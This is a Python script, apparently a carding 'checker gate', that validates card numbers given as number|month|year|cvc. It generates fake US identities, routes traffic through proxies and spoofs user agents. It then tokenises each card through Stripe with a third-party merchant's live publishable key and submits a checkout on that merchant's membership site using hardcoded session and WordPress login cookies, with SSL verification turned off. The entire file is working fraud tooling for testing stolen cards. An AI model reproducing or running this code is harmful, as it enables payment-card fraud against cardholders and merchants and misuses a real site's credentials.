import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

#$30
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele2(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b80e14a2-8d25-4481-99f1-7505dc68df503f308b&muid=123926e1-d23b-48c0-9cfd-be6534475c4488169a&sid=03f9fbf7-377a-484f-a278-f64e1f56b1a4227de7&payment_user_agent=stripe.js%2F680542e9e4%3B+stripe-js-v3%2F680542e9e4%3B+split-card-element&referrer=https%3A%2F%2Fflyglitch.com&time_on_page=28764&key=pk_live_UC9AsolKtWxFtuiZuoXXcZvU'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet2" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://flyglitch.com/membership-account/membership-checkout/?level=2'

    headers1 = {
       'authority': 'flyglitch.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://flyglitch.com',
        'referer': 'https://flyglitch.com/membership-account/membership-checkout/?level=2',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    
    data2 = {
    "AccountNumber": "XXXXXXXXXXXX0521",
    "CardType": "visa",
    "ExpirationMonth": "09",
    "ExpirationYear": "2026",
    "autorenew": "1",
    "autorenew_present": "1",
    "checkjavascript": "1",
    "current_region": "Canada (East Coast)",
    "discount_code": "",
    "first_name": "Mireya",
    "how_did_you_hear_about_us": "Friend",
    "javascriptok": "1",
    "last_name": "nick",
    "level": "2",
    "other_discount_code": "",
    "payment_method_id": id,
    "submit-checkout": "1"
    }
    
    cookies = {
    "__stripe_mid": "123926e1-d23b-48c0-9cfd-be6534475c4488169a",
    "__stripe_sid": "03f9fbf7-377a-484f-a278-f64e1f56b1a4227de7",
    "_tccl_visit": "4044747a-cc28-583e-891f-f57cb648b75d",
    "_tccl_visitor": "4044747a-cc28-583e-891f-f57cb648b75d",
    "PHPSESSID": "b2fa41a1be94fa0680e30dc1c3936f1a",
    "pmpro_visit": "1",
    "wordpress_logged_in_dd182e5aa801159fed866ced74dd6d96": "thih09089%40bugfoo.com%7C1699668177%7CIgUquYkPht9zlWI4T6swJKmMK4DwqbAqRuvrqBGbKDn%7Ca85cb995ba04e2f935a8756fbca822a607d39382dad37016104d01db323ed29c",
    "wordpress_test_cookie": "WP%20Cookie%20check"
    }
    
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 2")
